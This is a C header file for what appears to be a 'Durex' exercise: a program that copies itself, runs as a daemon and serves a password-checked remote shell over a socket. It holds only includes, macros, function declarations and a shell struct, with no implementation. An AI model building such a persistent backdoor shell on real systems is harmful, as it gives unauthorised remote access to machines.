#ifndef DUREX_H
#define DUREX_H

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <syslog.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <net/if.h>


#define LOGIN "dbaffier"
#define MAX_CLIENT 3

#define ERROR_MSG(str) \
    printf(str);       \
    return (1);

#define FNV_PRIME_32 16777619
#define FNV_OFFSET_32 2166136261U

int isCopy(void);
void createDurex(void);
void daemon_durex(void);
void shell(void);
uint32_t FNV32(const char *s);
void builtin(int sd, char *buffer);

typedef struct s_shell
{
    int ss;
    int thread;
    int opt;
    int port;
    struct sockaddr_in server_addr;
} t_shell;

#endif